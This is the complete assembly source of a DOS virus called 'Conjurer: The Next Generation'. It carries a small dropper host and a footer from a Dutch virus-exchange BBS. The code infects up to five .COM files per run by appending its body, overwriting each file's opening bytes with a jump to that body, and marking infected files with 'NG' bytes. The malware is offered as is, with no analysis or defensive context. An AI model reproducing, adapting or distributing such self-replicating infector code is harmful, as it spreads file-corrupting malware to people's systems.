

.Radix 16
    ORG  100h
DUMMY:                            ; This is the dummy host!
    Jmp  S_O_V                    ; Jump to real virus
    DW   'NG'                     ; Next Generation ID bytes

    Push CS                       ; This is the original program
    Pop  DS
    Mov  DX, Offset Dropper
    Mov  AH, 09
    Int  21
    Int  20                       ; Exit from host
Dropper:                          ; A little message!
    DB   'This is a dropper of:',0Dh,0A
    DB   'Conjurer: The Next Generation!',0Dh,0A,'$'

S_O_V:                            ; Start Of Virus
    Call GetDelta                 ; Get the delta offset
GetDelta:                         ; Junk label
    Pop  BP
    Sub  BP, Offset GetDelta

    Push CS                       ; Code will be equal to Data segment
    Pop  DS

    Push CS                       ; Restore original bytes
    Pop  ES
    Lea  SI, [Original+BP]        ; DS:SI -> Source Pointer
    Mov  DI, 0100                 ; ES:DI -> Destination Pointer
    MovSW                         ; MOVe Store Word
    MovSW                         ; MOVe Store Word
    MovSB                         ; MOVe Store Byte

    Mov  AH, 1A                   ; Set the DTA
    Lea  DX, [E_O_V+BP]           ; To end of virus
    Int  21

RealStart:                        ; This is where the virus really starts!
    Mov  Byte Ptr [Counter+BP], 0 ; Reset Infection Counter
    Mov  AH, 4E                   ; Dos FNC 4E == Find First
    Lea  DX, [FileSpec+BP]        ; DS:DX == Offset file-spec
    Mov  CX, 0000                 ; Just normal files
FindIt:                           ; This is where the int 21 is
    Cmp  Byte Ptr [Counter+BP], 5 ; Five infections per run
    Je   Exit_Virus

    Int  21
    Jc   Exit_Virus               ; No more files

    Call Infect                   ; Infect the file!

    Mov  AH, 4F                   ; Dos FNC 4F = Find Next
    Jmp  FindIt

Exit_Virus:                       ; This will restore the first bytes
    Mov  AH, 1A                   ; Reset DTA
    Mov  DX, 0080
    Int  21

    Mov  DI, 0100
    Push DI
    Ret

Infect:
    Mov  AX, 3D02                 ; Open file random access
    Lea  DX, [E_O_V+1E+BP]        ; PSP + 1Eh == Filename
    Int  21h
    Jc   Exit_Infect              ; Error? Don't do fancy just exit!

    Xchg AX, BX                   ; BX == AX for the file-handle

    Mov  AH, 3F                   ; Read from file
    Mov  CX, 0005                 ; Read five bytes (JuMP + ID)
    Lea  DX, [Original+BP]        ; The original bytes
    Int  21

    Cmp  Word Ptr [Original+3+BP],'NG' ; Check if already infected
    Je   CloseIt

    Mov  AX, 4202                 ; Seek to End Of File
    Mov  CX, 0000
    Mov  DX, 0000
    Int  21

    Sub  AL, 03                   ; Modify the patch-table
    Mov  Word Ptr [Jump_Table+1+BP], AX

    Mov  AH, 40                   ; Append the virus
    Mov  CX, (E_O_V - S_O_V)      ; Bytes to write
    Lea  DX, [S_O_V+BP]           ; DS:DX points to Start Of Virus
    Int  21

    Mov  AX, 4200                 ; Seek to Start Of File
    Mov  CX, 0000
    Mov  DX, 0000
    Int  21

    Mov  AH, 40                   ; Write our jump table
    Mov  CX, 0005
    Lea  DX, [Jump_Table+BP]
    Int  21

    Inc  Byte Ptr [Counter+BP]    ; Increase infection counter

CloseIt:
    Mov  AH, 3E
    Int  21

Exit_Infect:                      ; Exit the infection routine
    Ret

DataSegment:                      ; This is the data-segment
Counter:                          ; This is the infection counter
    DB   0
FileSpec:                         ; This is the file-spec
    DB   '*.COM',0
Original:                         ; These are the original 5 bytes
    DB   90, 90, 90, 90, 90       ; Five nops
Jump_Table:
    DB   0E9, 04, 00              ; JuMP to S_O_V
    DW   'NG'                     ; Plus ID bytes

E_O_V:                            ; End Of Virus
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Remember Where You Saw This Phile First ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄ[=] ARRESTED DEVELOPMENT +31.77.547477 The Netherlands [=]ÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

